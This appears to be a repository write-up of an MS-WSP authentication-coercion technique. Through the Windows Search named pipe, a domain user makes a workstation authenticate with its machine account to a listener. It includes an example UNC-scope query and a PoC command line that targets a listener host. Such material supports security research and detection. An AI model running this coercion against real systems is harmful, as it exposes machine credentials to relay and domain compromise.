# MS-WSP - Remote query with a UNC scope (CPMCreateQueryIn)

## Summary

+ **Protocol**: [[MS-WSP]: Windows Search Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsp/3cd8b660-4b73-4a7f-9c30-0f8bb30d9dc6)

+ **Transport**: message-based protocol over the **SMB named pipe `\pipe\MSFTEWDS`** (TCP/445). Unlike the other entries in this repository, MS-WSP is **not** a DCE/RPC interface with opnums — messages are exchanged with `FSCTL_PIPE_TRANSCEIVE` and identified by a message type in the header.

+ **Messages used**: `CPMConnectIn` (`0x000000C8`) then `CPMCreateQueryIn` (`0x000000CA`), followed by `CPMDisconnect` (`0x000000C9`).

+ **Authenticated**: Yes — **any domain user**; no special privilege on the target is required.

## Description

The Windows Search service indexes content and answers queries over MS-WSP. A client first sends a
`CPMConnectIn` to attach to the target's `Windows\SYSTEMINDEX` catalog, then a `CPMCreateQueryIn`
containing a query whose **scope/restriction references a path**. If that path is a **UNC**
(expressed as a `file://` URI such as `file:////<listener>/SomeFolder`), the target's Windows Search
service resolves it and connects out to the listener over SMB, authenticating as the **target's
machine account** — an authentication coercion.

The original technique drives this through the Windows Search OLE DB provider
(`Provider=Search.CollatorDSO`) with a query of the form:

```sql
SELECT TOP 10 System.ItemFolderPathDisplay, System.ItemName
FROM <target>.SystemIndex
WHERE SCOPE='file:////<listener>/SomeFolder'
```

The `FROM <target>.SystemIndex` makes the local provider open MS-WSP to the remote `<target>`, and
the UNC in `SCOPE` is what the target reaches out to. The PoC here speaks MS-WSP directly over
`\pipe\MSFTEWDS` (no OLE DB provider needed on the attacker host): it sends a `CPMConnectIn` and a
`CPMCreateQueryIn` whose property restriction value is the listener URI.

## Requirements

+ A **domain user** context (no privileged rights on the target).
+ **TCP/445** reachable on both the target and the listener.
+ The **Windows Search service running on the target** (the `\pipe\MSFTEWDS` pipe must be present).
  It is **not enabled by default on Windows Server**, so in practice this coercion is effective
  against **Windows workstations** (where Windows Search is enabled by default).
+ The **target must be addressed by hostname** (short name), not by IP address.

## Proof of concept

See [poc/python/coerce_poc.py](./poc/python/coerce_poc.py):

```bash
./coerce_poc.py -d LAB.local -u user -p 'Password123!' 'file:////192.168.1.10/x' WORKSTATION1
```

It authenticates over SMB, opens `\pipe\MSFTEWDS`, and sends `CPMConnectIn` → `CPMCreateQueryIn`
(scope = the listener URI) → `CPMDisconnect`. The target then authenticates to the listener with its
machine account.

## Testing status

The SMB/`\pipe\MSFTEWDS` message flow (authentication, `IPC$`, pipe open, `CPMConnectIn`/
`CPMCreateQueryIn` construction) was validated. The end-to-end coercion could not be re-confirmed in
this environment because the test host is **Windows Server**, where the Windows Search service is not
installed by default (the PoC reports `MsFteWds pipe not available`). The technique itself is
established against Windows workstations by the referenced projects.

## References

+ [MS-WSP]: Windows Search Protocol: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsp/
+ Original PoC (OLE DB provider) — `slemire/WSPCoerce`: https://github.com/slemire/WSPCoerce
+ impacket implementation this PoC is based on (MIT) — `RedTeamPentesting/wspcoerce`: https://github.com/RedTeamPentesting/wspcoerce
